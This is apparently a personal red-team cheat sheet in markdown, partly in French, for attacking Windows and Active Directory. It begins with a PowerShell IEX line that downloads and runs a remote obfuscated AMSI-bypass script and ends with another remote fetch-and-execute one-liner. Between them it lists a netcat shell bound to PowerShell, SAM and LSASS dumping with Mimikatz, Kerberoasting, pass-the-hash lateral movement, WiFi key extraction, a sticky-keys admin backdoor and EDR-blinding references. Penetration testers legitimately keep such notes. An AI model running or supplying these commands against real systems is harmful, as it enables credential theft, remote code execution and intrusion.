### Legitimate files for security audit

$key need to be set

```
IEX(New-Object Net.WebClient).downloadstring('https://raw.githubusercontent.com/TikTakTech/Salsa/main/KP_Obf_ISMA_Bypass_Salsa.ps1')
```

# CYBER CHEAT SHEET

Global Ressources
---
https://www.thehacker.recipes/

https://viperone.gitbook.io/pentest-everything

https://book.hacktricks.xyz/

https://atomicredteam.io/atomics/

https://github.com/S3cur3Th1sSh1t/

https://beta.hackndo.com/

https://exploit-notes.hdks.org/

https://www.ired.team/

Cheatsheet
---

https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf

https://cheatsheet.haax.fr/passcracking-hashfiles/hashcat_cheatsheet/

https://0xsp.com/offensive/red-team-cheatsheet/

Runas
---
```
runas /user:dom\monuser /netonly cmd
```

Kiosk evasion
---
```
file://c:/windows/system32/calc.exe
\\127.0.0.1\c$
file:///c:\windows\system32\cmd.exe
```

Recent user activity
---
```
C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Recent
```

Url file attack
---
https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication

https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/forced-coercion/url-file-attack

https://github.com/mdsecactivebreach/Farmer

https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/


Responder
---
```
sudo responder -I eth0
/usr/share/responder/logs
```

Scan / nmap
---
```
rustscan -a 10.10.69.43
rustscan -a 10.10.105.148 --ulimit 5000 -- -A
nmap -A 10.10.10.10 -T5
```

RPCClient / Enum4linux
---
```

```
ncat
---
```
nc -lvnp 4444
rlwrap nc -nnvp 4443
ncat -lvnp 12345 --ssl
```
Windows -> création de raccourcis (contournement restriction PS) ;-)
```
nc64.exe -l -v -n -p 4444 -e powershell
nc64.exe 127.0.0.1 4444
```
https://github.com/int0x33/nc.exe/blob/master/nc64.exe

https://www.revshells.com/

Files transfert
---
```
# In Kali Explorer
smb://P1234.mondomaine.fr/c$

# Windows <- Kali
python -m http.server
http://IP:8000

# Windows -> Kali
impacket-smbserver -smb2support test .
impacket-smbserver -smb2support monshare . -username "mon.user" -password "monpassword"
copy sam.save \\kali\test\sam.save
copy system.save \\kali\test\system.save
```
https://ironhackers.es/en/cheatsheet/transferir-archivos-post-explotacion-cheatsheet/

https://github.com/timvisee/send-instances/

IWR Download alternative :
```
esentutl.exe /y \\$server\$share\$procdump /d $temp\$filename /o
```

SmbClient
---
```
smbclient -L \\\\10.10.105.148\\
```

SMB scan
---
snaffler.exe -s -v Data -o snaffler.log

Passwords
---
https://haveibeenpwned.com

https://breachdirectory.org

> Sans bloquer lockout
> 
https://www.login-securite.com/2024/06/03/spray-passwords-avoid-lockouts/

Sysvol
---
```
\\mon-domaine.fr\sysvol # Windows
smb://monserveur/c$ # Thunar
```


Password in GPO
---
![image](https://github.com/TikTakTech/Salsa/assets/114105972/45e450e0-3a09-4da1-89d0-24db9bc8adb7)


BloodHound
---
```
bloodhound-python -d domain -u username@domain -p password -c all -ns domain_controller_ip -v
sudo apt install bloodhound
sudo neo4j console
http://localhost:7474/
(neo4j/neo4j)
bloodhound
```
https://medium.com/@leviathan36/active-directory-testing-with-bloodhound-a33b88622d2f


ADMiner
---
```
pipx install 'git+https://github.com/Mazars-Tech/AD_Miner.git'
reopen shell ;-)
AD-miner -c -cf My_Report -u neo4j -p mypassword
```
https://github.com/Mazars-Tech/AD_Miner


NTLM / Pass the hash
---
```
Install-Module -Name DSInternals
ConvertTo-NTHash
```

https://www.scip.ch/en/?labs.20210909

https://beta.hackndo.com/pass-the-hash/

https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/


SAM dump
---
```
reg.exe save hklm\sam sam.save
reg.exe save hklm\system system.save
# Files transfert
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

Evil-WinRM
---
https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/
```
evil-winrm -i X.X.X.X -u mon.user -p 'Monpassword'
```

WinRM
---
```
winrs -r:10.10.10.10 "msg * test"
```

Kerberos
---

https://beta.hackndo.com/kerberos/

https://france.devoteam.com/paroles-dexperts/la-securite-des-protocoles-dauthentification-ntlm-et-kerberos-en-environnement-active-directory/

https://www.thibautprobst.fr/fr/posts/kerberos/

![image](https://github.com/TikTakTech/Salsa/assets/114105972/aa55712f-5bc3-4a52-a71f-70b1ee2298ad)


Kerberoasting - SPN
---
```
Invoke-Kerberoast -OutputFormat Hashcat | % { $_.Hash } | Out-File hashes.txt -Encoding ASCII
impacket-GetUserSPNs 'mondomaine.fr/mon.user:monpassword' -outputfile kerberoastable.txt -dc-ip X.X.X.X
hashcat -m 13100 --force -a 0 /home/kali/Downloads/hashes.txt /home/kali/Downloads/rockyou.txt
```
/!\ Windows/Linux encodage -> ~~0xOD~~ OxOA 

https://atomicredteam.io/credential-access/T1558.003/

https://github.com/cyberark/RiskySPN

https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1

https://www.youtube.com/watch?v=ycNadGeq03E

https://raw.githubusercontent.com/EmpireProject/Empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-Kerberoast.ps1

https://beta.hackndo.com/service-principal-name-spn/

```
$search = New-Object DirectoryServices.DirectorySearcher([ADSI]"")
$search.filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"
$results = $search.Findall()
foreach($result in $results)
{
	$userEntry = $result.GetDirectoryEntry()
	Write-host "User : " $userEntry.name "(" $userEntry.distinguishedName ")"
	Write-host "SPNs"        
	foreach($SPN in $userEntry.servicePrincipalName)
	{
		$SPN       
	}
	Write-host ""
}
```
https://beta.hackndo.com/kerberoasting/


MEMCM - PXE
---
https://www.secura.com/blog/attacking-mitigating-windows-pxe-environments

https://www.netspi.com/blog/technical-blog/network-penetration-testing/attacks-against-windows-pxe-boot-images

https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps

https://connect.ed-diamond.com/MISC/misc-103/compromission-des-postes-de-travail-grace-a-laps-et-pxe

https://www.acceis.fr/sattaquer-aux-images-pxe

https://github.com/wavestone-cdt/powerpxe

https://tryhackme.com/r/room/breachingad


Spraying
---

https://www.login-securite.com/2024/06/03/spray-passwords-avoid-lockouts/

https://github.com/login-securite/conpass


Linux Toolkit
---
https://korben.info/outils-crise-linux-indispensables-pros-it.html

https://www.brendangregg.com/blog/2024-03-24/linux-crisis-tools.html

```
netstat -tulpn
```

DNS
---
DNS4all 194.0.5.3
CloudFlare 1.1.1.1
dns.sb 185.222.222.222, 45.11.45.11

Lateral mouvement
---
```
xfreerdp /v:10.10.10.10 /u:mon.user /pth:123456789123456789 /cert:ignore
xfreerdp /v:IPADDRESS /u:USERNAME /p:PASSWORD /d:DOMAIN /drive:SHARE,/path/shared 
nxc smb 10.10.10.10 --local-auth -u administrator -H 123456789123456789 -x whoami
evil-winrm -i 10.10.10.10 -u "mon.user" -H 123456789123456789 
```

Wifi
---
```
netsh wlan show profile
netsh wlan show profile SSID key=clear
```

Kpaste
---
https://kpaste.infomaniak.com/

Prise de notes
---
Joplin

Websites Enumeration / screenshot
---
Eyewitness
Gowitness

OST/PST Visualization
---
XstReader

Searching files
---

locate monfichier.txt
where monfichier.txt
where /r c: windbg.*
dir /s monfichier.txt

TryHackMe
---

https://tryhackme.com/r/room/windowsforensics1
https://tryhackme.com/module/hacking-windows-1
https://tryhackme.com/r/room/adenumeration

ADACLScanner
---

https://github.com/canix1/ADACLScanner
https://learn.microsoft.com/fr-fr/archive/blogs/pfesweplat/forensics-active-directory-acl-investigation
https://labs.lares.com/securing-active-directory-via-acls/

WinPEBuilder
---

https://github.com/cmartinezone/WinPEBuilder
```
# adksetup + module adkwinpesetup
# Dism /Set-InputLocale:fr-FR /Image:%winpe_root%\mount
# Adminlocal
# cmd.exe -> sethc.exe -> shift x5 -> net user /add tech XXXX & net localgroup administrateurs tech /Add
```

Suppression propre profil/user
---
```
# Système > Paramètres avancés du système > Profils des utilisateurs > Paramètres
```

LSASS : MemoryDump + Volatility
---
https://redteamrecipe.com/50-methods-for-lsass-dumprtc0002
https://diverto.github.io/2019/11/05/Extracting-Passwords-from-hiberfil-and-memdumps
```
impacket-smbserver -smb2support monshare .
net use Z: \\computer_name\monshare /PERSISTENT:YES
winpmem_mini_x64.exe Z:mondmp.raw
ou
winpmem_mini_x64.exe mondmp.raw
copy mondmp.raw T:mondmp.raw
net use T: /delete
# volatility_2.6_win64_standalone.exe -f .\mondmp.raw imageinfo # Volatility 2.6 = version récente W10 pb
# volatility_2.6_win64_standalone.exe -f mondmp.raw --profile=Win10x64 raw2dmp -O mondmp.dmp # Volatility 2.6 = version récente W10 pb
https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/memory-dump-analysis/volatility-cheatsheet
git clone https://github.com/volatilityfoundation/volatility3.git
cd volatility3
pip3 install -r requirements.txt
./vol.py --help | grep windows
./vol.py --info
./vol.py -f '/home/kali/Downloads/mydump.raw' windows.info.Info
./vol.py -f '/home/kali/Downloads/mydump.raw' windows.lsadump.Lsadump
./vol.py -f '/home/kali/Downloads/mydump.raw' windows.hashdump.Hashdump
./vol.py -f '/home/kali/Downloads/p8242.raw' windows.cachedump.Cachedump

./vol.py -f '/home/kali/Downloads/p8242.raw' windows.pstree.PsTree
./vol.py -f '/home/kali/Downloads/p8242.raw' windows.memmap.Memmap --pid 1064 --dump

```

NTLM Hash Generator
---

```
iconv -f ASCII -t UTF-16LE <(printf "test") | openssl dgst -md4
```

Mimikatz
---
```
privilege::debug
sekurlsa::logonpasswords
sekurlsa:minidump "C:\Users\adminlocal\Downloads\lsass.DMP"
```
https://powerseb.github.io/posts/LSASS-parsing-without-a-cat/

https://github.com/powerseb/PowerExtract/blob/main/Invoke-PowerExtract.ps1

LSASS : MemoryDump + Windbg + Mimikatz
---
```
net use Z: \\computer_name\monshare /PERSISTENT:YES

winpmem_mini_x64_rc2.exe Z:mondmp.mem
ou winpmem_mini_x64_rc2.exe mondump.mem + copy mondump.mem Z:mondmp.mem
# MemProcFS.exe -device ..\mondump.mem -forensic 1 -mount S # -> mondump.dmp

ou DumpIt.exe /OUTPUT z:mondump.dmp /QUIET

windgb + memory.dmp
0:kd>.load C:\Users\XXX\Downloads\mimikatz_trunk\x64\mimilib.dll ### Attention : sans les guillements
0:kd>!process 0 0 lsass.exe
0:kd>.process /r /p ffff9a8c884130c0(PROCESS)
0:kd>!mimikatz

net use z: /delete

With Powershel ? No ! Just user dump !
$ss = Get-CimInstance -ClassName MSFT_StorageSubSystem -Namespace Root\Microsoft\Windows\Storage;
Invoke-CimMethod -InputObject $ss -MethodName "GetDiagnosticInfo" -Arguments @{DestinationPath="c:\users\adminlocal\desktop"; IncludeLiveDump=$true};


```
https://github.com/Velocidex/WinPmem

https://github.com/ufrisk/MemProcFS

https://github.com/dokan-dev/dokany

https://learn.microsoft.com/fr-fr/windows-hardware/drivers/debugger/

https://github.com/gentilkiwi/mimikatz

https://github.com/y00ga-sec/Forensike/

https://powerseb.github.io/posts/LSASS-parsing-without-a-cat/

Port -> Process
---
```
netstat -abo | findstr "64098"
tasklist /fi "pid eq 11960"
```

Mails Anonymes
---

https://email-anonyme.5ymail.com

Analyse malveillants
---

https://github.com/mandiant/capa


EDR
---
```
fltMC.exe
NSudoLC.exe -U:T -P:E cmd
Ordinateur\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\FileInfo\Instances\FileInfo
```
https://tierzerosecurity.co.nz/2024/03/27/blind-edr.html

https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/compiling-first-kernel-driver-kdprint-dbgprint-and-debugview

https://v3ded.github.io/redteam/red-team-tactics-writing-windows-kernel-drivers-for-advanced-persistence-part-1

https://synzack.github.io/Blinding-EDR-On-Windows/

https://community.sap.com/t5/technology-blogs-by-sap/how-to-run-process-monitor-with-reduced-altitude/ba-p/13484744

W11
---
```
SHIFT + F10 -> oobe\bypassnro
```

Network Capture - Who is pinging ?
---
https://techcommunity.microsoft.com/t5/iis-support-blog/capture-a-network-trace-without-installing-anything-amp-capture/ba-p/376503
https://www.microsoft.com/en-us/download/details.aspx?id=4865

XAML - PS GUI
---

https://gist.github.com/QuietusPlus/0bceaf7f52eb23841e3f7bcf191fc6df

https://www.foxdeploy.com/blog/part-ii-deploying-powershell-guis-in-minutes-using-visual-studio.html

Assembleur
---

https://cutter.re/

http://windbg.info/doc/1-common-cmds.html

https://www.youtube.com/@billskycomputerguy

KomanetskyFunctions // Irvine
---

https://www.dropbox.com/scl/fo/bv9f8bp1zmccchya7pthg/h?rlkey=wg1ky9dh0cnmh8lsc5hfmk4re&e=1&dl=0

https://www.asmirvine.com/gettingStartedVS2017/index.htm

https://securitytimes.medium.com/understanding-and-abusing-process-tokens-part-i-ee51671f2cfa

Admin local offline
---
```
WinPE or Shift F10 at installation USB -> cmd
cmd.exe -> cmd.old
sethc.exe -> cmd.exe
c:\Windows\system32\control userpasswords2
```
OneLiner Powershell with params
---
```
& ([ScriptBlock]::Create((irm https://get.activated.win))) /para
```
